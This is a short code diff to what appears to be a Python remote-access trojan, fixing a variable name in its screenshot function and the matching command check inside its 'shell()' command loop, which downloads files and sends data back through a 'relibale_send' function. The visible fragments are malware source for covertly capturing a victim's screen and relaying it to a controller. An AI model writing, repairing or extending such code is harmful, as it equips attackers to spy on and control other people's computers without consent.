@@ -13,7 +13,7 @@ from mss import mss
 
 def screenshoot():
 	with  mss() as screenshot:
-		screenshoot.shot()
+		screenshot.shot()
 
 def downlaod(url):
 	get_response = requests.get(url)
@@ -76,7 +76,7 @@ def shell():
 			except Exception as e:
 				print(e)
 				relibale_send("failed to dowload".encode('utf-8'))
-		elif command[:10] == "screenshoot":
+		elif command[:10] == "screenshot":
 			try:
 				screenshoot()
 				with open("monitor-1.png", "rb") as sc:
